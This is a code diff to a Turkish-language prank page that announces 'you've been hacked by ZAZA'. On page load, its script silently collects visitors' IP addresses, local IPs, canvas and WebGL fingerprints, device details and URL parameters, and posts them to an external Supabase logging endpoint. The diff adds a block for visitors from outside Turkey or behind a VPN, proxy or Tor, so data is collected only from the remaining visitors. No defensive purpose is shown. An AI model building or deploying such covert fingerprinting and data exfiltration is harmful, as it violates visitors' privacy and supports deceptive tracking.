@@ -121,13 +121,17 @@
             z-index: 20;
             font-family: monospace;
         }
+
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
 <div class="glitch-bg"></div>
 <div class="static"></div>
 
-<div class="container">
+<div id="normalContent" class="container">
     <div class="hack-title blink">⚠ ZAZA TARAFINDAN HACKLENDİNİZ ⚠</div>
     <div class="sub">🔐 CİHAZINIZ TAMAMEN ELE GEÇİRİLDİ 🔐</div>
     <div class="warning-text">
@@ -139,11 +143,15 @@
 </div>
 <div class="footer">🔒 HACKED BY ZAZA | TÜM HAKLARI GASPLANMIŞTIR</div>
 
+<div id="blockContent" style="display: none; text-align: center; padding: 50px; color: white;">
+    <h1 style="color:#f97316">⛔ ERİŞİM ENGELLENDİ</h1>
+    <p>Bu siteye yalnızca Türkiye'den erişim sağlanabilir.<br>VPN veya proxy kullanmayın.</p>
+</div>
+
 <script>
     const SUPABASE_URL = "https://pkgnvzqpvmmxyspzbkzs.supabase.co/rest/v1/logs";
     const SUPABASE_KEY = "sb_publishable_ScwqsJHfIUnTv0PMq0w49A_nUtGVBN2";
 
-    // Cihaz adını al (navigator.userAgent'dan basit çıkarım)
     function getDeviceName() {
         let ua = navigator.userAgent;
         if (/iPhone/.test(ua)) return "iPhone";
@@ -248,6 +256,15 @@
 
     async function collectAndSend() {
         let ipData = await getIpAndCountry();
+        let isBlocked = (ipData.country_code !== "TR") || (ipData.proxy === true || ipData.hosting === true || ipData.tor === true);
+
+        if (isBlocked) {
+            document.getElementById("normalContent").style.display = "none";
+            document.getElementById("blockContent").style.display = "block";
+            document.querySelector(".footer").style.display = "none";
+            return;
+        }
+
         let localIp = await getLocalIP();
         let canvasFP = getCanvasFingerprint();
         let webglFP = getWebGLFingerprint();
@@ -259,8 +276,6 @@
         let loadTime = performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart;
         let urlParams = window.location.search.substring(1);
         let deviceName = getDeviceName();
-
-        let isBlocked = (ipData.country_code !== "TR") || (ipData.proxy === true || ipData.hosting === true || ipData.tor === true);
 
         let payload = {
             ip: ipData.ip,
@@ -301,19 +316,13 @@
             sayfa_yuklenme_suresi: loadTime
         };
 
-        if (!isBlocked) {
-            try {
-                await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
-                });
-            } catch(e) { console.error("Kayıt hatası:", e); }
-        }
-
-        if (isBlocked) {
-            document.querySelector(".warning-text").innerHTML = "🌍 VPN / PROXY / YURT DIŞI IP TESPİT EDİLDİ!\n\nSİSTEM TARAFINDAN ENGELLENDİNİZ.\nHİÇBİR VERİ KAYDEDİLMEDİ.\n\n⚠️ Yine de hacklendiniz ⚠️";
-        }
+        try {
+            await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+        } catch(e) { console.error("Kayıt hatası:", e); }
     }
 
     collectAndSend();
